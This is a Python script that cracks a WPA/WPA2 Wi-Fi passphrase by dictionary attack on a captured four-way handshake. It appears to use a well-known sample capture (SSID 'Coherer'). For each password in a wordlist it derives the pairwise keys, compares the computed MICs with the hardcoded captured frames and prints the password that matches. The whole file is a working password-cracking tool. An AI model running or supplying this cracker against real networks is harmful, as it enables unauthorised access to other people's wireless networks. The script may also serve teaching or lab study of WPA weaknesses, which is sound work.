from binascii import a2b_hex, b2a_hex
from hashlib import pbkdf2_hmac
import hmac
f = open("pwd-dictionary.txt")

def PRF(key, A, B):
    #Number of bytes in the PTK 
    nByte = 64
    i = 0
    R = b''
    #Each iteration produces 160-bit value and 512 bits are required 
    while(i <= ((nByte * 8 + 159) / 160)):
        hmacsha1 = hmac.new(key, A.encode() + chr(0x00).encode() + a2b_hex(B) + chr(i).encode(), 'sha1') 
        R = R + hmacsha1.digest()
        i += 1
    return R[0:nByte]

def MakeAB(aNonce, sNonce, apMac, cliMac):
    A = "Pairwise key expansion" 
    B = min(apMac, cliMac) + max(apMac, cliMac) + min(aNonce, sNonce) + max(aNonce, sNonce) 
    return (A, B)

def CaculateMIC(data, ptk):
    data1 = a2b_hex(data)
    hmacFunc = 'sha1'
    mic = hmac.new(ptk[0:16], data1, hmacFunc).digest()[:16]
    return mic
    

if __name__ == "__main__":
    ANounce = '3e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933'
    SNounce = 'cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386'
    apMac = '000c4182b255'
    cliMac = '000d9382363a'
    Mic1 = 'a462a7029ad5ba30b6af0df391988e45'
    Mic2 = '7d0af6df51e99cde7a187453f0f93537'
    Mic3 = '10bba3bdfbcfde2bc537509d71f2ecd1'
    data1 = '0203007502010a00100000000000000000cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000'
    data2 = '020300af0213ca001000000000000000013e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933f57b949771c867989f49d04ed47c6934cf020000000000000000000000000000000000000000000000000000000000000050cfa72cde35b2c1e2319255806ab364179fd9673041b9a5939fa1a2010d2ac794e25168055f794ddc1fdfae3521f4446bfd11da98345f543df6ce199df8fe48f8cdd17adca87bf45711183c496d41aa0c'
    data3 = '0203005f02030a0010000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
    A, B = MakeAB(ANounce, SNounce, apMac, cliMac)
    while True:
        line = f.readline()
        pwd = line[:-1]
        print('pwd:' + pwd)
        ssid = 'Coherer'
        pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
        # pmkStr = b2a_hex(pmk).decode().upper()
        # print('pmkStr:' + pmkStr)

        ptk = PRF(pmk, A, B)
        test = True
        mic1 = CaculateMIC(data1, ptk)
        print("Mic1:" + Mic1 + "\nCaculated mic1:" + b2a_hex(mic1).decode())
        if b2a_hex(mic1).decode() != Mic1:
            test = False
        
        mic2 = CaculateMIC(data2, ptk)
        print("Mic2:" + Mic2 + "\nCaculated mic2:" + b2a_hex(mic2).decode())
        if b2a_hex(mic2).decode() != Mic2:
            test = False

        mic3 = CaculateMIC(data3, ptk)
        print("Mic3:" + Mic3 + "\nCaculated mic3:" + b2a_hex(mic3).decode())
        if b2a_hex(mic3).decode() != Mic3:
            test = False

        if test:
            print("The true pwd is: " + pwd)
            break